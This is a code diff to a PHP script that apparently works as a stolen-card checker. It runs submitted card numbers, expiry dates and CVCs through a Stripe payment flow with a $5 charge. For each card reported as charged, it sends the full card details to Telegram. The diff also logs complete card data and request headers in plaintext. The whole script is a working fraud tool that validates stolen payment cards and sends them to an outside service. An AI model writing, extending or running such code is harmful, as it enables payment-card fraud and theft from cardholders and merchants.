@@ -149,7 +149,7 @@ session_start([
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -159,7 +159,7 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegra
 if (!$validation['valid']) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -169,7 +169,7 @@ if (!$validation['valid']) {
 if ($providedApiKey !== $expectedApiKey) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -177,13 +177,6 @@ if ($providedApiKey !== $expectedApiKey) {
 // Enable error reporting for debugging (disable in production)
 ini_set('display_errors', 0);
 error_reporting(E_ALL);
-
-// Optional file-based logging for debugging
- $log_file = __DIR__ . '/paypal0.1$_debug.log';
-function log_message($message) {
-    global $log_file;
-    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
-}
 
 // Track sent notifications to prevent duplicates
  $sent_notifications = [];
@@ -254,7 +247,7 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
     $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
     $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
+    $gateway = 'Stripe 5$'; // Updated for this gateway
     $formatted_response = formatResponse($response);
 
     // Construct Telegram message
@@ -299,10 +292,28 @@ if (!isset($_POST['card']) || !is_array($_POST['card'])) {
     exit;
 }
 
+// Get card details from POST request
+ $cardNumber = $_POST['card']['number'] ?? '';
+ $expMonth = $_POST['card']['exp_month'] ?? '';
+ $expYear = $_POST['card']['exp_year'] ?? '';
+ $cvc = $_POST['card']['cvc'] ?? '';
+
+// Validate card details
+if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
+    $errorMsg = ['status' => 'DECLINED', 'message' => 'Missing card details', 'response' => 'MISSING_CARD_DETAILS'];
+    log_message('Error 400: ' . json_encode($errorMsg));
+    echo json_encode($errorMsg);
+    exit;
+}
+
 // Format year to 4 digits if needed
 if (strlen($expYear) == 2) {
     $expYear = '20' . $expYear;
 }
+
+// Log request details
+ $logMsg = 'Request: Card=' . $cardNumber . '|' . $expMonth . '|' . $expYear . '|' . $cvc . ', Headers=' . print_r(getallheaders(), true);
+log_message($logMsg);
 
 // First API call to create payment method
  $headers = [
@@ -337,7 +348,13 @@ curl_close($ch);
 
 if ($httpCode != 200 || !isset($apx['id'])) {
     $errorMsg = $apx['error']['message'] ?? 'Unknown error';
-    echo json_encode(['status' => 'DECLINED', 'message' => $errorMsg]);
+    $responseMsg = [
+        'status' => 'DECLINED', 
+        'message' => $errorMsg,
+        'response' => $errorMsg
+    ];
+    log_message('Payment Method Error: ' . json_encode($responseMsg));
+    echo json_encode($responseMsg);
     exit;
 }
 
@@ -432,16 +449,25 @@ curl_close($ch);
 
 if (isset($apx1["failureType"])) {
     $apl = $apx1["failureType"];
-    echo json_encode([
+    $responseMsg = [
         'status' => 'DECLINED',
         'message' => 'Your card was declined',
         'response' => $apl
-    ]);
+    ];
+    log_message('Payment Declined: ' . json_encode($responseMsg));
+    echo json_encode($responseMsg);
 } else {
-    echo json_encode([
+    $responseMsg = [
         'status' => 'CHARGED',
         'message' => 'Your card has been charged $5.00 successfully.', // Changed from $1 to $5
         'response' => 'CHARGED'
-    ]);
+    ];
+    log_message('Payment Successful: ' . json_encode($responseMsg));
+    
+    // Send Telegram notification for CHARGED status
+    $card_details = "$cardNumber|$expMonth|$expYear|$cvc";
+    sendTelegramNotification($card_details, 'CHARGED', $responseMsg['response']);
+    
+    echo json_encode($responseMsg);
 }
 ?>
